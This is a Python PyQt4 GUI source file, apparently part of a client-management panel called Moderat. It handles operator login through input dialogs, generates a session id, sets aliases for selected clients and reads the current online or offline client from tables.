from PyQt4.QtGui import *
from PyQt4.QtCore import *
import os
import string
import random

from libs.language import Translate
from libs.gui import main


# Multi Lang
translate = Translate()
_ = lambda _word: translate.word(_word)



def id_generator(size=16, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


class Actions:

    def __init__(self, moderat):
        self.moderat = moderat

        # Create Main UI Functions
        self.ui = main.updateUi(self.moderat)

    def login(self):

    	self.moderat.session_id = id_generator(size=24)
        username, ok = QInputDialog.getText(self.moderat, _('UNLOCK_CLIENT'), _('ENTER_USERNAME'), QLineEdit.Normal)
        if ok:
            password, ok = QInputDialog.getText(self.moderat, _('UNLOCK_CLIENT'), _('ENTER_PASSWORD'), QLineEdit.Password)
            if ok:
                self.moderat.moderator.send_msg('auth %s %s' % (username, password), 'moderatorInitializing', session_id=self.moderat.session_id)
            else:
                self.ui.on_moderator_connected()
        else:
            self.ui.on_moderator_not_connected()

    def set_alias(self):
        client = self.current_client()
        if client:
            text, ok = QInputDialog.getText(self.moderat, _('ALIAS_SET'), _('ALIAS_NAME'))
            if ok:
                self.moderat.moderator.send_msg('%s %s' % (client, str(text)), 'setAlias', session_id=self.moderat.session_id)

        # get online client
    def current_client(self):
        try:
            return str(self.moderat.clientsTable.item(self.moderat.clientsTable.currentRow(), 3).text())
        except AttributeError:
            return False

    # get offline client
    def current_offline_client(self):
        try:
            return str(self.moderat.offlineClientsTable.item(self.moderat.offlineClientsTable.currentRow(), 2).text())
        except AttributeError:
            return False